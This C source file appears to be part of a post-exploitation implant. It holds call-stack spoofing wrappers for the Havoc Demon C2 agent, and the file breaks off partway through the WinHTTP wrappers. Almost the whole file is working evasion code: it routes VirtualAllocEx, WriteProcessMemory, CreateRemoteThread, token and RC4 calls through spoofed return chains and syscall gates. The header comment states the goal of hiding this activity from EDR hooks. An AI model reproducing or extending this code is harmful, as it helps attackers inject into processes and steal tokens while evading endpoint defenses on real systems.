/*
 * hooks.c — PICO call-stack spoof wrappers for Havoc Demon
 *
 * Compiled into hooks.x64.o and merged by pico.spec.
 * Every _FunctionName below must have a matching "addhook" in pico.spec.
 *
 * ARCHITECTURE NOTE — call-stack spoofing only, NOT syscall substitution:
 *   These wrappers intercept the IAT entry and call spoof_call(), which
 *   sets up a fake return-address chain before invoking the real API.
 *   EDR usermode hooks (ntdll patches) are still hit — the call stack
 *   just looks clean when the hook fires.
 *   For full hook bypass, combine with indirect/direct syscalls.
 *
 * SPOOF_CALL ARG LIMIT — check spoof.h before compiling:
 *   FUNCTION_CALL.args[] must hold at least 12 entries.
 *   NtCreateThreadEx, NtCreateFile, CreateProcessWithLogonW all pass 11 args.
 *   Recommended: change to  ULONG_PTR args[16];  in spoof.h.
 *
 * IAT NOTE:
 *   Only statically imported functions (present in the Demon IAT) are
 *   intercepted. APIs resolved at runtime via DJB2 hash walking or
 *   GetProcAddress bypass these wrappers.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <oaidl.h>
#include "spoof.h"
#include "gate_init.h"
#include <tlhelp32.h>

/* g_gates must be defined HERE (same TU) to avoid IMAGE_REL_AMD64_ADDR64
 * relocations that Crystal Palace cannot process in PIC shellcode. */
GATE_TABLE g_gates;

void hooks_init_gates(PVOID ntdll, FARPROC gpa)
{
    init_gates(ntdll, gpa, &g_gates);
}

/* ── NT helper types / macros for syscall paths ──────────────────────────── */
#ifndef NT_SUCCESS
# define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif
#ifndef OBJ_INHERIT
# define OBJ_INHERIT 0x00000002UL
#endif
#ifndef THREAD_ALL_ACCESS
# define THREAD_ALL_ACCESS 0x001FFFFFUL
#endif
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001UL

/* Own OBJECT_ATTRIBUTES — winternl.h not included to avoid conflicts */
typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;      /* PUNICODE_STRING — always NULL in our usage */
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} CK_OBJECT_ATTRIBUTES;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CK_CLIENT_ID;

typedef struct {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} CK_IO_STATUS_BLOCK;


/* SystemFunction032 (RC4) uses this struct */
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PUCHAR Buffer;
} USTRING;

/* Avoid dependency on amsi.h */
typedef PVOID HAMSICONTEXT;
typedef PVOID HAMSISESSION;
typedef int   AMSI_RESULT;

#ifndef DECLSPEC_IMPORT
# ifdef __GNUC__
#  define DECLSPEC_IMPORT __attribute__((dllimport))
# else
#  define DECLSPEC_IMPORT __declspec(dllimport)
# endif
#endif

/* ======================================================================== */
/* KERNEL32                                                                  */
/* ======================================================================== */

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateProcess( HANDLE hProcess, UINT uExitCode );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle( HANDLE hObject );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$ResumeThread( HANDLE hThread );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32FirstW( HANDLE hSnapshot, LPPROCESSENTRY32W lppe );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW( HANDLE hSnapshot, LPPROCESSENTRY32W lppe );
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA( LPCSTR lpLibFileName );
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress( HMODULE hModule, LPCSTR lpProcName );

LPVOID WINAPI _VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtAllocateVirtualMemory.jmpAddr ) {
        PVOID  base = lpAddress;
        SIZE_T size = dwSize;
        GATE_CALL( call, g_gates.NtAllocateVirtualMemory );
        call.argc    = 6;
        call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[1] = spoof_arg( &base );
        call.args[2] = spoof_arg( 0ULL );
        call.args[3] = spoof_arg( &size );
        call.args[4] = spoof_arg( (ULONG)flAllocationType );
        call.args[5] = spoof_arg( (ULONG)flProtect );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? base : NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualAlloc);
    call.argc    = 4;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( flAllocationType );
    call.args[3] = spoof_arg( flProtect );
    return (LPVOID)spoof_call( &call );
}

LPVOID WINAPI _VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtAllocateVirtualMemory.jmpAddr ) {
        PVOID  base = lpAddress;
        SIZE_T size = dwSize;
        GATE_CALL( call, g_gates.NtAllocateVirtualMemory );
        call.argc    = 6;
        call.args[0] = spoof_arg( hProcess );
        call.args[1] = spoof_arg( &base );
        call.args[2] = spoof_arg( 0ULL );
        call.args[3] = spoof_arg( &size );
        call.args[4] = spoof_arg( (ULONG)flAllocationType );
        call.args[5] = spoof_arg( (ULONG)flProtect );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? base : NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualAllocEx);
    call.argc    = 5;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( lpAddress );
    call.args[2] = spoof_arg( dwSize );
    call.args[3] = spoof_arg( flAllocationType );
    call.args[4] = spoof_arg( flProtect );
    return (LPVOID)spoof_call( &call );
}

BOOL WINAPI _VirtualFree( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtFreeVirtualMemory.jmpAddr ) {
        PVOID  base = lpAddress;
        SIZE_T size = dwSize;
        GATE_CALL( call, g_gates.NtFreeVirtualMemory );
        call.argc    = 4;
        call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[1] = spoof_arg( &base );
        call.args[2] = spoof_arg( &size );
        call.args[3] = spoof_arg( (ULONG)dwFreeType );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualFree);
    call.argc    = 3;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( dwFreeType );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtProtectVirtualMemory.jmpAddr ) {
        PVOID  base = lpAddress;
        SIZE_T size = dwSize;
        GATE_CALL( call, g_gates.NtProtectVirtualMemory );
        call.argc    = 5;
        call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[1] = spoof_arg( &base );
        call.args[2] = spoof_arg( &size );
        call.args[3] = spoof_arg( (ULONG)flNewProtect );
        call.args[4] = spoof_arg( lpflOldProtect );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualProtect);
    call.argc    = 4;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( dwSize );
    call.args[2] = spoof_arg( flNewProtect );
    call.args[3] = spoof_arg( lpflOldProtect );
    return (BOOL)spoof_call( &call );
}

HANDLE WINAPI _CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtCreateThreadEx.jmpAddr ) {
        HANDLE hThread = NULL;
        ULONG  flags   = (dwCreationFlags & CREATE_SUSPENDED) ? THREAD_CREATE_FLAGS_CREATE_SUSPENDED : 0;
        GATE_CALL( call, g_gates.NtCreateThreadEx );
        call.argc     = 11;
        call.args[0]  = spoof_arg( &hThread );
        call.args[1]  = spoof_arg( THREAD_ALL_ACCESS );
        call.args[2]  = spoof_arg( 0ULL );
        call.args[3]  = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[4]  = spoof_arg( lpStartAddress );
        call.args[5]  = spoof_arg( lpParameter );
        call.args[6]  = spoof_arg( flags );
        call.args[7]  = spoof_arg( 0ULL );
        call.args[8]  = spoof_arg( dwStackSize );
        call.args[9]  = spoof_arg( 0ULL );
        call.args[10] = spoof_arg( 0ULL );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        if ( NT_SUCCESS( s ) ) {
            if ( lpThreadId ) *lpThreadId = 0;
            return hThread;
        }
        return NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$CreateThread);
    call.argc    = 6;
    call.args[0] = spoof_arg( lpThreadAttributes );
    call.args[1] = spoof_arg( dwStackSize );
    call.args[2] = spoof_arg( lpStartAddress );
    call.args[3] = spoof_arg( lpParameter );
    call.args[4] = spoof_arg( dwCreationFlags );
    call.args[5] = spoof_arg( lpThreadId );
    return (HANDLE)spoof_call( &call );
}

HANDLE WINAPI _OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtOpenProcess.jmpAddr ) {
        HANDLE            hProcess = NULL;
        CK_OBJECT_ATTRIBUTES oa    = { sizeof(oa), NULL, NULL, bInheritHandle ? OBJ_INHERIT : 0, NULL, NULL };
        CK_CLIENT_ID      ci       = { ULongToHandle(dwProcessId), NULL };
        GATE_CALL( call, g_gates.NtOpenProcess );
        call.argc    = 4;
        call.args[0] = spoof_arg( &hProcess );
        call.args[1] = spoof_arg( dwDesiredAccess );
        call.args[2] = spoof_arg( &oa );
        call.args[3] = spoof_arg( &ci );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? hProcess : NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$OpenProcess);
    call.argc    = 3;
    call.args[0] = spoof_arg( dwDesiredAccess );
    call.args[1] = spoof_arg( bInheritHandle );
    call.args[2] = spoof_arg( dwProcessId );
    return (HANDLE)spoof_call( &call );
}

BOOL WINAPI _TerminateProcess( HANDLE hProcess, UINT uExitCode )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtTerminateProcess.jmpAddr ) {
        GATE_CALL( call, g_gates.NtTerminateProcess );
        call.argc    = 2;
        call.args[0] = spoof_arg( hProcess );
        call.args[1] = spoof_arg( (NTSTATUS)uExitCode );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$TerminateProcess);
    call.argc    = 2;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( uExitCode );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _CloseHandle( HANDLE hObject )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtClose.jmpAddr ) {
        GATE_CALL( call, g_gates.NtClose );
        call.argc    = 1;
        call.args[0] = spoof_arg( hObject );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$CloseHandle);
    call.argc    = 1;
    call.args[0] = spoof_arg( hObject );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtReadVirtualMemory.jmpAddr ) {
        GATE_CALL( call, g_gates.NtReadVirtualMemory );
        call.argc    = 5;
        call.args[0] = spoof_arg( hProcess );
        call.args[1] = spoof_arg( lpBaseAddress );
        call.args[2] = spoof_arg( lpBuffer );
        call.args[3] = spoof_arg( nSize );
        call.args[4] = spoof_arg( lpNumberOfBytesRead );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$ReadProcessMemory);
    call.argc    = 5;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( lpBaseAddress );
    call.args[2] = spoof_arg( lpBuffer );
    call.args[3] = spoof_arg( nSize );
    call.args[4] = spoof_arg( lpNumberOfBytesRead );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtWriteVirtualMemory.jmpAddr ) {
        GATE_CALL( call, g_gates.NtWriteVirtualMemory );
        call.argc    = 5;
        call.args[0] = spoof_arg( hProcess );
        call.args[1] = spoof_arg( lpBaseAddress );
        call.args[2] = spoof_arg( lpBuffer );
        call.args[3] = spoof_arg( nSize );
        call.args[4] = spoof_arg( lpNumberOfBytesWritten );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$WriteProcessMemory);
    call.argc    = 5;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( lpBaseAddress );
    call.args[2] = spoof_arg( lpBuffer );
    call.args[3] = spoof_arg( nSize );
    call.args[4] = spoof_arg( lpNumberOfBytesWritten );
    return (BOOL)spoof_call( &call );
}

HANDLE WINAPI _CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtCreateThreadEx.jmpAddr ) {
        HANDLE hThread = NULL;
        ULONG  flags   = (dwCreationFlags & CREATE_SUSPENDED) ? THREAD_CREATE_FLAGS_CREATE_SUSPENDED : 0;
        GATE_CALL( call, g_gates.NtCreateThreadEx );
        call.argc     = 11;
        call.args[0]  = spoof_arg( &hThread );
        call.args[1]  = spoof_arg( THREAD_ALL_ACCESS );
        call.args[2]  = spoof_arg( 0ULL );
        call.args[3]  = spoof_arg( hProcess );
        call.args[4]  = spoof_arg( lpStartAddress );
        call.args[5]  = spoof_arg( lpParameter );
        call.args[6]  = spoof_arg( flags );
        call.args[7]  = spoof_arg( 0ULL );
        call.args[8]  = spoof_arg( dwStackSize );
        call.args[9]  = spoof_arg( 0ULL );
        call.args[10] = spoof_arg( 0ULL );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        if ( NT_SUCCESS( s ) ) {
            if ( lpThreadId ) *lpThreadId = 0;
            return hThread;
        }
        return NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$CreateRemoteThread);
    call.argc    = 7;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( lpThreadAttributes );
    call.args[2] = spoof_arg( dwStackSize );
    call.args[3] = spoof_arg( lpStartAddress );
    call.args[4] = spoof_arg( lpParameter );
    call.args[5] = spoof_arg( dwCreationFlags );
    call.args[6] = spoof_arg( lpThreadId );
    return (HANDLE)spoof_call( &call );
}

DWORD WINAPI _ResumeThread( HANDLE hThread )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtResumeThread.jmpAddr ) {
        ULONG prev = 0;
        GATE_CALL( call, g_gates.NtResumeThread );
        call.argc    = 2;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( &prev );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? prev : (DWORD)-1;
    }
    call.ptr     = (PVOID)(KERNEL32$ResumeThread);
    call.argc    = 1;
    call.args[0] = spoof_arg( hThread );
    return (DWORD)spoof_call( &call );
}

HANDLE WINAPI _CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$CreateToolhelp32Snapshot);
    call.argc = 2;
    call.args[0] = spoof_arg(dwFlags);
    call.args[1] = spoof_arg(th32ProcessID);
    return (HANDLE)spoof_call(&call);
}

BOOL WINAPI _Process32FirstW( HANDLE hSnapshot, LPPROCESSENTRY32W lppe )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$Process32FirstW);
    call.argc = 2;
    call.args[0] = spoof_arg(hSnapshot);
    call.args[1] = spoof_arg(lppe);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _Process32NextW( HANDLE hSnapshot, LPPROCESSENTRY32W lppe )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$Process32NextW);
    call.argc = 2;
    call.args[0] = spoof_arg(hSnapshot);
    call.args[1] = spoof_arg(lppe);
    return (BOOL)spoof_call(&call);
}

HMODULE WINAPI _LoadLibraryA( LPCSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$LoadLibraryA);
    call.argc = 1;
    call.args[0] = spoof_arg(lpLibFileName);
    return (HMODULE)spoof_call(&call);
}

/* ======================================================================== */
/* ADVAPI32                                                                  */
/* ======================================================================== */

DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$OpenProcessToken( HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$RevertToSelf( VOID );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$CreateProcessWithTokenW( HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$CreateProcessWithLogonW( LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$LookupPrivilegeValueA( LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$AdjustTokenPrivileges( HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$OpenThreadToken( HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle );
DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$SetThreadToken( PHANDLE Thread, HANDLE Token );
DECLSPEC_IMPORT NTSTATUS WINAPI ADVAPI32$SystemFunction032( USTRING *data, USTRING *key );

BOOL WINAPI _OpenProcessToken( HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtOpenProcessToken.jmpAddr ) {
        GATE_CALL( call, g_gates.NtOpenProcessToken );
        call.argc    = 3;
        call.args[0] = spoof_arg( ProcessHandle );
        call.args[1] = spoof_arg( (ULONG)DesiredAccess );
        call.args[2] = spoof_arg( TokenHandle );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr  = (PVOID)(ADVAPI32$OpenProcessToken);
    call.argc = 3;
    call.args[0] = spoof_arg( ProcessHandle );
    call.args[1] = spoof_arg( DesiredAccess );
    call.args[2] = spoof_arg( TokenHandle );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _RevertToSelf( VOID )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$RevertToSelf);
    call.argc = 0;
    return (BOOL)spoof_call(&call);
}

/* 9 args — fixed (was incorrectly 7 in prior version) */
BOOL WINAPI _CreateProcessWithTokenW( HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$CreateProcessWithTokenW);
    call.argc = 9;
    call.args[0] = spoof_arg(hToken);
    call.args[1] = spoof_arg(dwLogonFlags);
    call.args[2] = spoof_arg(lpApplicationName);
    call.args[3] = spoof_arg(lpCommandLine);
    call.args[4] = spoof_arg(dwCreationFlags);
    call.args[5] = spoof_arg(lpEnvironment);
    call.args[6] = spoof_arg(lpCurrentDirectory);
    call.args[7] = spoof_arg(lpStartupInfo);
    call.args[8] = spoof_arg(lpProcessInformation);
    return (BOOL)spoof_call(&call);
}

/* 11 args — requires args[16] in spoof.h */
BOOL WINAPI _CreateProcessWithLogonW( LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
{
    FUNCTION_CALL call = { 0 };
    call.ptr   = (PVOID)(ADVAPI32$CreateProcessWithLogonW);
    call.argc  = 11;
    call.args[0]  = spoof_arg(lpUsername);
    call.args[1]  = spoof_arg(lpDomain);
    call.args[2]  = spoof_arg(lpPassword);
    call.args[3]  = spoof_arg(dwLogonFlags);
    call.args[4]  = spoof_arg(lpApplicationName);
    call.args[5]  = spoof_arg(lpCommandLine);
    call.args[6]  = spoof_arg(dwCreationFlags);
    call.args[7]  = spoof_arg(lpEnvironment);
    call.args[8]  = spoof_arg(lpCurrentDirectory);
    call.args[9]  = spoof_arg(lpStartupInfo);
    call.args[10] = spoof_arg(lpProcessInformation);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _LookupPrivilegeValueA( LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$LookupPrivilegeValueA);
    call.argc = 3;
    call.args[0] = spoof_arg(lpSystemName);
    call.args[1] = spoof_arg(lpName);
    call.args[2] = spoof_arg(lpLuid);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _AdjustTokenPrivileges( HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$AdjustTokenPrivileges);
    call.argc = 6;
    call.args[0] = spoof_arg(TokenHandle);
    call.args[1] = spoof_arg(DisableAllPrivileges);
    call.args[2] = spoof_arg(NewState);
    call.args[3] = spoof_arg(BufferLength);
    call.args[4] = spoof_arg(PreviousState);
    call.args[5] = spoof_arg(ReturnLength);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _OpenThreadToken( HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtOpenThreadToken.jmpAddr ) {
        GATE_CALL( call, g_gates.NtOpenThreadToken );
        call.argc    = 4;
        call.args[0] = spoof_arg( ThreadHandle );
        call.args[1] = spoof_arg( (ULONG)DesiredAccess );
        call.args[2] = spoof_arg( (ULONG)OpenAsSelf );
        call.args[3] = spoof_arg( TokenHandle );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr  = (PVOID)(ADVAPI32$OpenThreadToken);
    call.argc = 4;
    call.args[0] = spoof_arg( ThreadHandle );
    call.args[1] = spoof_arg( DesiredAccess );
    call.args[2] = spoof_arg( OpenAsSelf );
    call.args[3] = spoof_arg( TokenHandle );
    return (BOOL)spoof_call( &call );
}

/* first param is PHANDLE — fixed (was HANDLE in prior version) */
BOOL WINAPI _SetThreadToken( PHANDLE Thread, HANDLE Token )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$SetThreadToken);
    call.argc = 2;
    call.args[0] = spoof_arg(Thread);
    call.args[1] = spoof_arg(Token);
    return (BOOL)spoof_call(&call);
}

NTSTATUS WINAPI _SystemFunction032( USTRING *data, USTRING *key )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$SystemFunction032);
    call.argc = 2;
    call.args[0] = spoof_arg(data);
    call.args[1] = spoof_arg(key);
    return (NTSTATUS)spoof_call(&call);
}


/* ======================================================================== */
/* WINHTTP                                                                   */
/* ======================================================================== */

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen( LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags );
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect( HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved );
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest( HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpSetOption( HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpAddRequestHeaders( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpSendRequest( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpReceiveResponse( HINTERNET hRequest, LPVOID lpReserved );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpReadData( HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpQueryHeaders( HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex );
DECLSPEC_IMPORT BOOL      WINAPI WINHTTP$WinHttpCloseHandle( HINTERNET hInternet );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$GetModuleHandleA ( LPCSTR lpModuleName );

#define WINHTTP_GADGET ( (PVOID) KERNEL32$GetModuleHandleA ( "winhttp.dll" ) )

HINTERNET WINAPI _WinHttpOpen( LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags )
{
    FUNCTION_CALL call = { 0 };
